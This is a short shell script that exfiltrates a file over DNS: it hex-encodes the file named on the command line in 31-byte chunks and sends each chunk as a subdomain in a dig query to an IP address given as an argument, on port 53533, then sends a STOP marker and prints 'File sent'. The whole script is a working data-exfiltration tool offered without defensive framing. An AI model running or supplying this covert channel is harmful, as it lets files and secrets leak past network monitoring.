#!/bin/sh

# File to emit

ip=$1
file_path=$2

id=$(date +%s)

count=1

xxd -ps -c 31 "$file_path" | while read hex; do
  domain="$hex.$count.$id"
  dig @"$ip" -p 53533 "$domain" +retry=1 +timeout=1 > /dev/null
  count=$((count + 1))
done

dig @"$ip" -p 53533 "STOP.0.$id" > /dev/null

echo "File sent"

